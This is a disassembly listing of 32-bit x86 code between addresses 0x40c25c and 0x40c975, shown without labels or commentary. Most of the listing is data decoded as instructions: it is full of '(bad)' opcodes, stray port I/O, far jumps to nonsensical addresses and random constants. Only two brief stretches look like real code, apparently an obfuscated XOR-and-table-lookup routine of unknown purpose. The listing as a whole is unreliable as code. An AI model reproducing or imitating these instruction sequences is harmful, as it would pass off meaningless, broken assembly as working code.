  40c25c:	xchg   esp,eax
  40c25d:	push   esp
  40c25e:	xor    eax,0xc68744b8
  40c263:	xchg   DWORD PTR [ebx-0x624d63da],esp
  40c269:	lds    esi,FWORD PTR [edi-0x80]
  40c26c:	jmp    0x40c2ba
  40c26e:	or     BYTE PTR [edi+ebp*1],bl
  40c271:	aaa    
  40c272:	xchg   DWORD PTR [edi-0x75794390],edi
  40c278:	sti    
  40c279:	push   esi
  40c27a:	xor    bh,ch
  40c27c:	and    al,cl
  40c27e:	push   esp
  40c27f:	jb     0x40c259
  40c281:	ja     0x40c260
  40c283:	or     BYTE PTR [esi+esi*1-0x78],ah
  40c287:	cmp    DWORD PTR [edi],esp
  40c289:	outs   dx,DWORD PTR ds:[esi]
  40c28a:	mov    al,ds:0x880a3d52
  40c28f:	push   ebx
  40c290:	into   
  40c291:	fstp   TBYTE PTR [edi+ecx*4+0x34]
  40c295:	inc    ebx
  40c296:	stc    
  40c297:	sub    BYTE PTR [eax],dh
  40c299:	cmp    al,0x38
  40c29b:	inc    ebp
  40c29c:	jmp    0x1fa6:0x843c882
  40c2a3:	addr16 cld 
  40c2a5:	inc    esi
  40c2a6:	leave  
  40c2a7:	inc    ebp
  40c2a8:	push   ecx
  40c2a9:	cmc    
  40c2aa:	(bad)  
  40c2ab:	dec    ebp
  40c2ac:	cmp    al,BYTE PTR [ebp+0x51]
  40c2af:	ds pop esp
  40c2b1:	aaa    
  40c2b2:	cmp    al,bl
  40c2b4:	sub    dh,ch
  40c2b6:	fdiv   DWORD PTR [edi-0x3e42977d]
  40c2bc:	push   ds
  40c2bd:	cmp    ebx,edi
  40c2bf:	mov    bl,0xb7
  40c2c1:	rcr    DWORD PTR [esi+0x73],0xe
  40c2c5:	imul   ebx,ecx,0x59fbbaa9
  40c2cb:	jmp    0x2efb4162
  40c2d0:	dec    eax
  40c2d1:	jno    0x40c2cb
  40c2d3:	leave  
  40c2d4:	rcr    BYTE PTR ds:0xdd67dae9,1
  40c2da:	xor    eax,0x471c602f
  40c2e0:	sar    BYTE PTR [eax+0x7974ad93],cl
  40c2e6:	push   ebp
  40c2e7:	and    cl,bh
  40c2e9:	jecxz  0x40c2bd
  40c2eb:	call   0xe0a0:0xb5f00e72
  40c2f2:	push   es
  40c2f3:	cmp    edi,DWORD PTR [ecx]
  40c2f5:	mov    DWORD PTR [ebp-0x1d2be386],edx
  40c2fb:	mov    ?,WORD PTR [ecx]
  40c2fd:	mov    dh,0x6
  40c2ff:	push   eax
  40c300:	mov    cl,BYTE PTR [ecx]
  40c302:	ret    
  40c303:	es scas al,BYTE PTR es:[edi]
  40c305:	xchg   BYTE PTR [eax-0x4],al
  40c308:	mov    ch,0x4f
  40c30a:	push   esp
  40c30b:	ds add ch,0x0
  40c30f:	sbb    cl,BYTE PTR [ebp-0x1ba23a1a]
  40c315:	aaa    
  40c316:	add    esp,ecx
  40c318:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c319:	sbb    ch,BYTE PTR [edx]
  40c31b:	push   eax
  40c31c:	iret   
  40c31d:	dec    edx
  40c31e:	cmp    BYTE PTR [ecx-0x59],cl
  40c321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c322:	ins    DWORD PTR es:[edi],dx
  40c323:	jmp    0x40c346
  40c325:	ret    
  40c326:	leave  
  40c327:	daa    
  40c328:	fcomp  DWORD PTR [edi]
  40c32a:	push   edi
  40c32b:	test   ch,bh
  40c32d:	pop    ebp
  40c32e:	ins    BYTE PTR es:[edi],dx
  40c32f:	sbb    ebx,ebx
  40c331:	(bad)  [eax-0x35]
  40c334:	pop    edi
  40c335:	pusha  
  40c336:	dec    edx
  40c337:	mov    esp,0x9609db14
  40c33c:	mov    gs,ecx
  40c33e:	cli    
  40c33f:	xor    eax,0x512037eb
  40c344:	out    0x17,eax
  40c346:	repz out dx,eax
  40c348:	clc    
  40c349:	jmp    FWORD PTR ds:0x5b50bde1
  40c34f:	xchg   edi,eax
  40c350:	(bad)  
  40c351:	xor    eax,0xe94c429a
  40c356:	jp     0x40c31d
  40c358:	out    0x93,al
  40c35a:	dec    eax
  40c35b:	popa   
  40c35c:	pop    ds
  40c35d:	fldenv [ecx+eiz*2-0x4ed00ace]
  40c364:	in     al,0x5a
  40c366:	repnz ds in al,dx
  40c369:	push   esi
  40c36a:	retf   
  40c36b:	int3   
  40c36c:	push   ss
  40c36d:	push   ecx
  40c36e:	bound  eax,QWORD PTR [ecx+0x14]
  40c371:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c372:	adc    DWORD PTR [esi-0x23],0xffffffb6
  40c376:	mov    ah,0x48
  40c378:	std    
  40c379:	popf   
  40c37a:	ds in  al,dx
  40c37c:	les    esi,FWORD PTR [esi+ebp*2]
  40c37f:	jmp    0x6a9e:0xc7844314
  40c386:	sti    
  40c387:	lods   eax,DWORD PTR ds:[esi]
  40c388:	mul    dh
  40c38a:	movnti DWORD PTR [esi],esp
  40c38d:	or     eax,0xf7847f13
  40c392:	cmp    eax,DWORD PTR [ebx+0x6d68aa21]
  40c398:	retf   
  40c399:	jl     0x40c36e
  40c39b:	sahf   
  40c39c:	test   al,0x7f
  40c39e:	rcl    DWORD PTR [edx+0x4f],0x73
  40c3a2:	jbe    0x40c3ed
  40c3a4:	dec    edx
  40c3a5:	fisttp QWORD PTR [ebx]
  40c3a7:	pop    edi
  40c3a8:	sbb    BYTE PTR [ebp-0x31],al
  40c3ab:	ins    DWORD PTR es:[edi],dx
  40c3ac:	cwde   
  40c3ad:	ror    DWORD PTR [esi+0x644b4c18],cl
  40c3b3:	int    0xb5
  40c3b5:	adc    al,BYTE PTR [ebp+esi*1+0x1bf66bc6]
  40c3bc:	loop   0x40c41d
  40c3be:	xor    esp,esp
  40c3c0:	(bad)  
  40c3c1:	or     al,BYTE PTR [ecx-0x1]
  40c3c4:	push   cs
  40c3c5:	retf   0xf4c3
  40c3c8:	inc    esp
  40c3c9:	fwait
  40c3ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3cb:	dec    eax
  40c3cc:	inc    ecx
  40c3cd:	ror    DWORD PTR [edx-0x9],cl
  40c3d0:	into   
  40c3d1:	push   edi
  40c3d2:	arpl   WORD PTR [ecx+0x6b2c9ad4],cx
  40c3d8:	or     eax,0x21423ce5
  40c3dd:	push   0xffffffab
  40c3df:	push   eax
  40c3e0:	dec    edi
  40c3e1:	test   DWORD PTR [esi-0x65c7700b],esi
  40c3e7:	mov    dl,0x7a
  40c3e9:	aaa    
  40c3ea:	das    
  40c3eb:	push   esp
  40c3ec:	push   0x24
  40c3ee:	icebp  
  40c3ef:	mov    BYTE PTR [ecx-0x7b],al
  40c3f2:	add    ebx,DWORD PTR [edx+0x41]
  40c3f5:	jo     0x40c3ca
  40c3f7:	pop    ebx
  40c3f8:	popf   
  40c3f9:	push   esi
  40c3fa:	ret    0x4a33
  40c3fd:	or     bl,BYTE PTR [edi+0x31]
  40c400:	sbb    dh,BYTE PTR [edx]
  40c402:	jo     0x40c42a
  40c404:	stc    
  40c405:	fadd   DWORD PTR [ecx]
  40c407:	aad    0x2d
  40c409:	xchg   ebx,eax
  40c40a:	mov    cl,0x69
  40c40c:	xor    edx,ebp
  40c40e:	push   esi
  40c40f:	aam    0xf
  40c411:	rcr    BYTE PTR [eax-0x1b6a8b2c],0xce
  40c418:	sub    DWORD PTR fs:[esi],ebp
  40c41b:	mov    ebp,0x253396dc
  40c420:	lock sub al,BYTE PTR [ebp-0x17]
  40c424:	retf   0xf391
  40c427:	mul    BYTE PTR [eax+ebp*2+0x2]
  40c42b:	push   ebp
  40c42c:	out    0x33,eax
  40c42e:	push   es
  40c42f:	jbe    0x40c3fe
  40c431:	lea    ecx,[esi-0x7e9f4ebf]
  40c437:	or     cl,BYTE PTR [ebx-0x75]
  40c43a:	xor    esp,DWORD PTR [edx+esi*8]
  40c43d:	pop    ebx
  40c43e:	aaa    
  40c43f:	popa   
  40c440:	ins    BYTE PTR es:[edi],dx
  40c441:	xor    ch,BYTE PTR [eax-0x60]
  40c444:	clc    
  40c445:	icebp  
  40c446:	jae    0x40c489
  40c448:	inc    ebx
  40c449:	in     eax,dx
  40c44a:	imul   BYTE PTR [esi-0x4c]
  40c44d:	in     al,dx
  40c44e:	int    0xff
  40c450:	jle    0x40c471
  40c452:	pop    ecx
  40c453:	rcr    cl,0xbd
  40c456:	sbb    al,0xa4
  40c458:	pop    ecx
  40c459:	daa    
  40c45a:	sahf   
  40c45b:	xor    BYTE PTR [ebp+0x16],al
  40c45e:	sbb    ah,BYTE PTR [esi]
  40c460:	jmp    0x270005be
  40c465:	fcomip st,st(4)
  40c467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c468:	pop    edi
  40c469:	mov    esp,0x201b2491
  40c46e:	hlt    
  40c46f:	xor    BYTE PTR [ebx],ah
  40c471:	xlat   BYTE PTR ds:[ebx]
  40c472:	and    al,0x4d
  40c474:	push   edi
  40c475:	in     al,dx
  40c476:	out    dx,eax
  40c477:	inc    esi
  40c478:	jmp    0x40c431
  40c47a:	push   edi
  40c47b:	rcr    BYTE PTR [eax],1
  40c47d:	loope  0x40c4f3
  40c47f:	and    BYTE PTR es:[ecx-0x19],0x68
  40c484:	mov    dh,0xa4
  40c486:	gs pop edx
  40c488:	repz (bad)
  40c48b:	popf   
  40c48c:	adc    DWORD PTR [edx-0x5c],0x11
  40c490:	mov    ah,0x7d
  40c492:	aam    0x93
  40c494:	jmp    0x59e4f8b
  40c499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c49a:	in     eax,0x4c
  40c49c:	add    eax,0x36e09070
  40c4a1:	aaa    
  40c4a2:	pusha  
  40c4a3:	xor    ebx,DWORD PTR [ebx+0x66775e1c]
  40c4a9:	pop    esp
  40c4aa:	ja     0x40c4ed
  40c4ac:	add    BYTE PTR [ebx+eax*2+0x3c],al
  40c4b0:	(bad)  
  40c4b1:	jae    0x40c448
  40c4b3:	push   esp
  40c4b4:	sub    al,0x64
  40c4b6:	popa   
  40c4b7:	xor    cl,BYTE PTR [edx+0x7c8146e2]
  40c4bd:	sar    DWORD PTR [edx],cl
  40c4bf:	retf   
  40c4c0:	cdq    
  40c4c1:	pop    esp
  40c4c2:	pop    edx
  40c4c3:	test   dl,bl
  40c4c5:	ja     0x40c4ad
  40c4c7:	rol    DWORD PTR [ecx],0xbe
  40c4ca:	cld    
  40c4cb:	adc    dh,ch
  40c4cd:	hlt    
  40c4ce:	cwde   
  40c4cf:	push   edx
  40c4d0:	icebp  
  40c4d1:	mov    edi,0x304504a9
  40c4d6:	into   
  40c4d7:	push   ecx
  40c4d8:	push   esi
  40c4d9:	xor    ebx,ecx
  40c4db:	retf   
  40c4dc:	das    
  40c4dd:	inc    edx
  40c4de:	pop    ss
  40c4df:	sbb    DWORD PTR [esp+eiz*2-0x37],edx
  40c4e3:	call   0xb720acc3
  40c4e8:	loop   0x40c4ae
  40c4ea:	cmp    ebp,ebp
  40c4ec:	aad    0x67
  40c4ee:	iret   
  40c4ef:	or     edi,DWORD PTR [ebx]
  40c4f1:	test   al,0xcf
  40c4f3:	imul   edx,edi
  40c4f6:	mov    DWORD PTR [ebp+0xc],edx
  40c4f9:	mov    edx,DWORD PTR [ebp+0xc]
  40c4fc:	mov    DWORD PTR [ebp-0x24],edx
  40c4ff:	mov    edx,DWORD PTR [ebp-0x8]
  40c502:	add    edx,DWORD PTR [ebp-0x40]
  40c505:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40c50c:	mov    DWORD PTR [ebp-0x1c],edx
  40c50f:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  40c516:	mov    DWORD PTR [ebp-0x44],0xf89c8538
  40c51d:	mov    edx,DWORD PTR [ebp-0x18]
  40c520:	xor    edx,eax
  40c522:	add    edx,ecx
  40c524:	jmp    0x40cdbf
  40c529:	mov    edx,DWORD PTR [ebp-0x18]
  40c52c:	xor    edx,eax
  40c52e:	jmp    0x40c945
  40c533:	sub    al,0x9b
  40c535:	inc    edx
  40c536:	(bad)  
  40c537:	dec    ebp
  40c538:	idiv   DWORD PTR [ebp+esi*2-0x2cf58fc4]
  40c53f:	or     BYTE PTR [edi+0x27],0xbe
  40c543:	rcl    BYTE PTR [esi+0x79707e7e],1
  40c549:	jle    0x40c5c9
  40c54b:	mov    edx,0x3d31460a
  40c550:	xchg   DWORD PTR [esi-0x1d4beffc],ecx
  40c556:	inc    edi
  40c557:	xchg   esi,eax
  40c558:	jp     0x40c4fb
  40c55a:	push   ss
  40c55b:	rcr    esp,0xa
  40c55e:	ret    0x5c42
  40c561:	ror    DWORD PTR [edi],1
  40c563:	adc    edi,esi
  40c565:	mov    ecx,0x5201ba4b
  40c56a:	dec    edx
  40c56b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c56c:	sbb    DWORD PTR [eax+edx*8],edi
  40c56f:	test   al,0x40
  40c571:	imul   esi,DWORD PTR [esp+ebp*8],0x1d
  40c575:	ins    DWORD PTR es:[edi],dx
  40c576:	pushf  
  40c577:	dec    edx
  40c578:	mov    ch,0x30
  40c57b:	cdq    
  40c57c:	add    BYTE PTR [esi],al
  40c57e:	pusha  
  40c57f:	outs   dx,BYTE PTR ds:[esi]
  40c580:	mov    edi,0xbe905215
  40c585:	or     esi,DWORD PTR [ecx]
  40c587:	adc    al,0xcb
  40c589:	sub    eax,0xfc4c3fa8
  40c58e:	in     eax,0x2e
  40c590:	test   eax,0xd3f3b80e
  40c595:	sbb    BYTE PTR [ebx+eax*4-0x16],0x4
  40c59a:	cdq    
  40c59b:	hlt    
  40c59c:	or     eax,0x5019392a
  40c5a1:	mov    al,0x1d
  40c5a3:	jbe    0x40c574
  40c5a5:	push   es
  40c5a6:	push   0x7594eea
  40c5ab:	and    DWORD PTR [edi],edx
  40c5ad:	mov    al,ds:0x76a7bb1f
  40c5b2:	push   0xffffff9b
  40c5b4:	xchg   edx,eax
  40c5b5:	fdiv   QWORD PTR [edi]
  40c5b7:	push   esp
  40c5b8:	xor    BYTE PTR [esi+0x2f],dl
  40c5bb:	dec    edi
  40c5bc:	pop    esi
  40c5bd:	bound  eax,QWORD PTR [esi+0x1d11a235]
  40c5c3:	jl     0x40c60d
  40c5c5:	sbb    eax,0x46f7a6c9
  40c5ca:	mov    ?,WORD PTR [ecx-0x72]
  40c5cd:	stos   BYTE PTR es:[edi],al
  40c5ce:	pop    eax
  40c5cf:	bound  edi,QWORD PTR [esi-0x6a]
  40c5d2:	shl    BYTE PTR [eax-0x4a9c7094],1
  40c5d8:	(bad)  
  40c5d9:	jge    0x40c563
  40c5db:	scas   eax,DWORD PTR es:[edi]
  40c5dc:	jne    0x40c5d4
  40c5de:	fbld   TBYTE PTR [esi+0x4d347cb7]
  40c5e4:	out    0xcc,al
  40c5e6:	and    ebp,DWORD PTR [eax+0x6a]
  40c5e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5ea:	icebp  
  40c5eb:	jbe    0x40c5ac
  40c5ed:	sti    
  40c5ee:	aaa    
  40c5ef:	aam    0x6f
  40c5f1:	popa   
  40c5f2:	pusha  
  40c5f3:	inc    ecx
  40c5f4:	xor    eax,0xf541d4d9
  40c5f9:	fisttp QWORD PTR [edi]
  40c5fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5fc:	xor    al,0x9e
  40c5fe:	mov    cs:0xf9fc1f3e,eax
  40c604:	add    al,BYTE PTR [edi+esi*8]
  40c607:	pop    ebp
  40c608:	mov    ds:0x2c296a01,eax
  40c60d:	jnp    0x40c60e
  40c60f:	cld    
  40c610:	neg    BYTE PTR [edi-0x10]
  40c613:	or     al,0xea
  40c615:	mov    al,ds:0x7bbaf034
  40c61a:	pop    ecx
  40c61b:	sub    edx,edx
  40c61d:	and    BYTE PTR [edi],bh
  40c61f:	xor    ecx,ebx
  40c621:	jl     0x40c60c
  40c623:	test   eax,0x925dd033
  40c628:	clc    
  40c629:	lock repz or al,BYTE PTR [edx+0x3c]
  40c62e:	adc    eax,0xb994a992
  40c633:	test   al,0x51
  40c635:	mov    ds:0xe5cd71eb,eax
  40c63a:	sbb    ebp,DWORD PTR [ecx+ecx*2]
  40c63d:	pusha  
  40c63e:	jmp    0x1812:0x291ac58
  40c645:	ss in  eax,dx
  40c647:	push   esi
  40c648:	neg    DWORD PTR [edx-0xbbc655b]
  40c64e:	mov    al,0x3c
  40c650:	and    esp,edx
  40c652:	div    ebp
  40c654:	ins    BYTE PTR es:[edi],dx
  40c655:	or     DWORD PTR [eax],ebp
  40c657:	ja     0x40c657
  40c659:	fdivrp st(5),st
  40c65b:	mov    dl,0x42
  40c65d:	(bad)  
  40c65e:	cld    
  40c65f:	in     al,dx
  40c660:	push   ebp
  40c661:	aaa    
  40c662:	ret    
  40c663:	stos   DWORD PTR es:[edi],eax
  40c664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c665:	xor    DWORD PTR [esi-0x28],eax
  40c668:	scas   eax,DWORD PTR es:[edi]
  40c669:	(bad)  
  40c66a:	pop    ebp
  40c66b:	push   esp
  40c66c:	in     eax,dx
  40c66d:	imul   ebp,DWORD PTR [ebx],0x844600c2
  40c673:	jge    0x40c6c7
  40c675:	(bad)  
  40c676:	ficomp DWORD PTR [eax+0x39]
  40c679:	pop    edx
  40c67a:	icebp  
  40c67b:	call   0x539b18f2
  40c680:	test   al,0xfe
  40c682:	sbb    al,0xfe
  40c684:	icebp  
  40c685:	mov    ?,edi
  40c687:	pop    esi
  40c688:	and    eax,0xad8cc170
  40c68d:	out    0x82,al
  40c68f:	inc    edi
  40c690:	jecxz  0x40c649
  40c692:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c693:	lods   eax,DWORD PTR ds:[esi]
  40c694:	(bad)  
  40c695:	call   0xb41:0x8038d0d7
  40c69c:	ror    dh,cl
  40c69e:	inc    esi
  40c69f:	push   ecx
  40c6a0:	jae    0x40c634
  40c6a2:	aas    
  40c6a3:	fnstsw WORD PTR [edi]
  40c6a5:	inc    ebx
  40c6a6:	jbe    0x40c645
  40c6a8:	cwde   
  40c6a9:	(bad)  
  40c6aa:	fs (bad) 
  40c6ac:	popa   
  40c6ad:	cmc    
  40c6ae:	pop    ecx
  40c6af:	out    0xeb,al
  40c6b1:	in     eax,dx
  40c6b2:	int3   
  40c6b3:	mov    eax,0x8025a818
  40c6b8:	push   ebp
  40c6b9:	add    BYTE PTR [ecx],ah
  40c6bb:	jmp    0xd381af59
  40c6c0:	imul   DWORD PTR [ebx+0x2e9862cd]
  40c6c6:	mov    al,ds:0xbe310a71
  40c6cb:	icebp  
  40c6cc:	fistp  WORD PTR [ecx+edi*2]
  40c6cf:	xor    al,0x22
  40c6d1:	ins    BYTE PTR es:[edi],dx
  40c6d2:	adc    al,0x16
  40c6d4:	xchg   edx,eax
  40c6d5:	mov    bh,0x44
  40c6d7:	inc    ecx
  40c6d8:	mov    edx,0x52f1c51e
  40c6dd:	sub    al,0x3d
  40c6df:	daa    
  40c6e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6e1:	in     eax,dx
  40c6e2:	cmp    ebx,esp
  40c6e4:	inc    edx
  40c6e5:	jo     0x40c6e3
  40c6e7:	jmp    0x17a5820c
  40c6ec:	test   DWORD PTR [esi],ebx
  40c6ee:	push   ecx
  40c6ef:	sbb    al,0x3d
  40c6f1:	pop    es
  40c6f2:	sbb    al,0x41
  40c6f4:	fmul   QWORD PTR [ecx+eiz*2+0xda9a6ad]
  40c6fb:	jns    0x40c6e4
  40c6fd:	inc    eax
  40c6fe:	or     bl,BYTE PTR [eax-0x24]
  40c701:	sbb    DWORD PTR [edi-0x12af8350],eax
  40c707:	lock inc edx
  40c709:	ds stos BYTE PTR es:[edi],al
  40c70b:	sub    al,0xcd
  40c70d:	xchg   esp,eax
  40c70e:	mov    dh,0x9b
  40c710:	imul   ebp,DWORD PTR [edi+0x4],0x39cb352a
  40c717:	cld    
  40c718:	inc    eax
  40c719:	addr16 inc eax
  40c71b:	bound  esp,QWORD PTR [ebx]
  40c71d:	lods   al,BYTE PTR ds:[esi]
  40c71e:	push   ebp
  40c71f:	sub    edi,DWORD PTR ds:0x297e84d5
  40c725:	imul   ebp,ecx,0x991120d2
  40c72b:	dec    ebx
  40c72c:	ret    
  40c72d:	inc    eax
  40c72e:	mov    dh,0xca
  40c730:	js     0x40c7a9
  40c732:	cmp    ebp,ebp
  40c734:	or     eax,ebp
  40c736:	add    ebx,DWORD PTR [edx]
  40c738:	push   ecx
  40c739:	call   FWORD PTR [edi]
  40c73b:	pushf  
  40c73c:	mov    ds:0xe667b63a,eax
  40c741:	jno    0x40c74f
  40c743:	mov    bh,0xd
  40c745:	inc    eax
  40c746:	stos   DWORD PTR es:[edi],eax
  40c747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c748:	push   0xdba0f83f
  40c74d:	pushf  
  40c74e:	btr    DWORD PTR [edx],ebp
  40c751:	ins    DWORD PTR es:[edi],dx
  40c752:	in     al,0xbc
  40c754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c755:	sub    DWORD PTR [ebx],ecx
  40c757:	cmp    BYTE PTR [ebx-0x3175529b],cl
  40c75d:	xor    dh,ch
  40c75f:	mov    eax,0xfbf5c05f
  40c764:	mov    dh,0xd7
  40c766:	(bad)  
  40c767:	and    al,0xc1
  40c769:	sub    ah,BYTE PTR [ecx+0x33]
  40c76c:	das    
  40c76d:	(bad)  
  40c76e:	mov    edx,DWORD PTR [eax+0x362111ac]
  40c774:	pop    edx
  40c775:	push   edi
  40c776:	arpl   WORD PTR [edi-0x70],bx
  40c779:	xor    esi,ebx
  40c77b:	fisttp DWORD PTR [eax-0x3db7991b]
  40c781:	sub    eax,0xb7b151e4
  40c786:	jecxz  0x40c7f5
  40c788:	mov    ebp,0x9267f3a6
  40c78d:	ss in  al,dx
  40c78f:	(bad)  
  40c790:	xor    eax,0x5b541161
  40c795:	ror    DWORD PTR [eax],cl
  40c797:	pushf  
  40c798:	sahf   
  40c799:	sbb    eax,0x200adf1c
  40c79e:	dec    esi
  40c79f:	call   0x525b:0x7cb01e78
  40c7a6:	or     eax,0x8bf2632
  40c7ab:	enter  0x4f58,0x4e
  40c7af:	xchg   edx,eax
  40c7b0:	xor    BYTE PTR [ecx],bh
  40c7b2:	dec    esp
  40c7b3:	and    dh,cl
  40c7b5:	nop
  40c7b6:	push   cs
  40c7b7:	xor    ecx,DWORD PTR [edx+0x3cd3271]
  40c7bd:	sub    DWORD PTR [eax],ebp
  40c7bf:	dec    eax
  40c7c0:	add    al,0xd2
  40c7c2:	into   
  40c7c3:	mov    WORD PTR [ebp-0x4b352a42],fs
  40c7c9:	popf   
  40c7ca:	imul   edx,ecx,0x59
  40c7cd:	push   es
  40c7ce:	and    BYTE PTR [edi],dl
  40c7d0:	lea    ecx,[edi-0x17fca149]
  40c7d6:	je     0x40c7e4
  40c7d8:	fst    DWORD PTR [edi+0x3be7653e]
  40c7de:	cmp    bh,BYTE PTR [edx]
  40c7e0:	into   
  40c7e1:	push   eax
  40c7e2:	call   FWORD PTR [edx]
  40c7e4:	aaa    
  40c7e5:	and    DWORD PTR [edx+0x52],esp
  40c7e8:	push   esi
  40c7e9:	test   DWORD PTR [ecx-0x50],edi
  40c7ec:	shl    DWORD PTR [eax-0x585e29d2],1
  40c7f2:	push   cs
  40c7f3:	push   ebp
  40c7f4:	es jg  0x40c85c
  40c7f7:	push   0xffffffc5
  40c7f9:	push   ecx
  40c7fa:	push   cs
  40c7fb:	(bad)  
  40c7fc:	push   0xe718dc5e
  40c801:	loop   0x40c785
  40c803:	arpl   WORD PTR [edi-0x4e003f28],sp
  40c809:	inc    edi
  40c80a:	lea    edx,[ecx-0x2e]
  40c80d:	jno    0x40c82f
  40c80f:	test   ecx,ebx
  40c811:	es ffree st(5)
  40c814:	dec    ebp
  40c815:	jno    0x40c84d
  40c817:	or     ch,bh
  40c819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c81a:	mov    esp,ecx
  40c81c:	push   es
  40c81d:	cmp    eax,0x5d85ce97
  40c822:	jmp    0x40c7ad
  40c824:	sbb    eax,0x5ff8ece2
  40c829:	adc    BYTE PTR [ebx+0x1e],0xf4
  40c82d:	xchg   ebx,eax
  40c82e:	mov    ecx,0x30c65106
  40c833:	sbb    BYTE PTR [ebx-0x23aa1d3f],al
  40c839:	lea    eax,[eax-0x3a3750ca]
  40c83f:	push   edx
  40c840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c841:	cld    
  40c842:	xchg   ebx,eax
  40c843:	jb     0x40c86e
  40c845:	ret    
  40c846:	lahf   
  40c847:	ins    BYTE PTR es:[edi],dx
  40c848:	retf   0x46d
  40c84b:	pop    esp
  40c84c:	pop    ecx
  40c84d:	je     0x40c80e
  40c84f:	pusha  
  40c850:	mov    DWORD PTR [edi],esi
  40c852:	(bad)  
  40c853:	xchg   ebp,eax
  40c854:	jae    0x40c8ae
  40c856:	sub    dh,BYTE PTR [eax-0x4694b317]
  40c85c:	xchg   esp,eax
  40c85d:	pop    esp
  40c85e:	mov    esi,eax
  40c860:	mov    eax,0x6357fe90
  40c865:	jne    0x40c7ef
  40c867:	sbb    edx,DWORD PTR [edx+0xf]
  40c86a:	ss clc 
  40c86c:	xor    al,0xde
  40c86e:	or     al,dh
  40c870:	mov    bl,0xad
  40c872:	cmp    eax,0xd8ded41f
  40c877:	outs   dx,BYTE PTR ds:[esi]
  40c878:	das    
  40c879:	shl    DWORD PTR [esi+0x58301ab9],cl
  40c87f:	mov    dh,0xd8
  40c881:	mov    ds:0x2ac9bce4,al
  40c886:	adc    BYTE PTR ds:0xefc69f07,cl
  40c88c:	in     eax,0x9c
  40c88e:	pusha  
  40c88f:	aaa    
  40c890:	xor    ebx,DWORD PTR [ecx]
  40c892:	cmp    al,0xcb
  40c894:	into   
  40c895:	inc    ebp
  40c896:	(bad)  
  40c897:	push   edx
  40c898:	adc    DWORD PTR [ebx+0x3aaac452],0x344dd4c9
  40c8a2:	adc    eax,0x7dd72181
  40c8a7:	xchg   ecx,eax
  40c8a8:	sub    ebx,esi
  40c8aa:	sti    
  40c8ab:	mov    ebx,0xb5007606
  40c8b0:	daa    
  40c8b1:	pusha  
  40c8b2:	pop    ecx
  40c8b3:	loopne 0x40c87e
  40c8b5:	int3   
  40c8b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8b7:	in     al,dx
  40c8b8:	aad    0x47
  40c8ba:	jecxz  0x40c851
  40c8bc:	test   BYTE PTR [ecx],dl
  40c8be:	inc    ebx
  40c8bf:	xor    edx,DWORD PTR [ecx+0x39a8d872]
  40c8c5:	inc    edx
  40c8c6:	mov    ch,0xfa
  40c8c8:	pop    es
  40c8c9:	jecxz  0x40c898
  40c8cb:	mov    bl,0x46
  40c8cd:	test   BYTE PTR [ecx+0x921a6ef],0x59
  40c8d4:	mov    ebp,0xe29435a6
  40c8d9:	mov    dh,0xc7
  40c8db:	lock js 0x40c931
  40c8de:	addr16 mov ebx,0xe91df4d9
  40c8e4:	dec    esi
  40c8e5:	jp     0x40c8a2
  40c8e7:	fisttp QWORD PTR [ebx+ecx*1]
  40c8ea:	in     eax,0x3b
  40c8ec:	mov    eax,ds:0x82b62fd3
  40c8f1:	ss xchg edi,eax
  40c8f3:	xchg   ecx,eax
  40c8f4:	jecxz  0x40c8ee
  40c8f6:	popa   
  40c8f7:	out    0x4f,eax
  40c8f9:	sbb    dh,ah
  40c8fb:	and    eax,0x5419afad
  40c900:	mov    cl,0xe
  40c902:	add    al,0x56
  40c904:	leave  
  40c905:	mov    edx,0x1875d6ca
  40c90a:	enter  0x97a4,0x1a
  40c90e:	push   es
  40c90f:	inc    eax
  40c910:	cmp    DWORD PTR [edx],ebp
  40c912:	mov    eax,edi
  40c914:	add    DWORD PTR [ecx],0xa98f3c5c
  40c91a:	sub    BYTE PTR [eax+0x4134c4e],dl
  40c920:	ja     0x40c961
  40c922:	mov    bh,0x31
  40c924:	xchg   edi,eax
  40c925:	cmc    
  40c926:	dec    edi
  40c927:	inc    eax
  40c928:	jns    0x40c95a
  40c92a:	adc    al,0x9c
  40c92c:	(bad)  
  40c92d:	dec    edi
  40c92e:	repnz hlt 
  40c930:	dec    esi
  40c931:	popf   
  40c932:	scas   eax,DWORD PTR es:[edi]
  40c933:	adc    al,0xb1
  40c935:	pop    ebx
  40c936:	popf   
  40c937:	aam    0x12
  40c939:	jae    0x40c8cf
  40c93b:	test   ebp,edx
  40c93d:	ins    DWORD PTR es:[edi],dx
  40c93e:	or     ch,0xb3
  40c941:	or     ch,bh
  40c943:	inc    edi
  40c944:	mov    ch,0x3
  40c946:	push   ebp
  40c947:	in     al,dx
  40c948:	mov    edi,DWORD PTR [ebp-0x1c]
  40c94b:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c952:	mov    BYTE PTR [ebp+0xf],dl
  40c955:	mov    edx,DWORD PTR [ebp-0xc]
  40c958:	xor    edx,eax
  40c95a:	add    edx,DWORD PTR [ebp-0x14]
  40c95d:	mov    edi,DWORD PTR [ebp-0x1c]
  40c960:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c967:	mov    BYTE PTR [ebp+0xb],dl
  40c96a:	mov    dl,BYTE PTR [ebp+0xf]
  40c96d:	mov    edi,DWORD PTR [ebp-0xc]
  40c970:	xor    edi,eax
  40c972:	add    edi,DWORD PTR [ebp-0x14]
  40c975:	mov    ebx,DWORD PTR [ebp-0x1c]
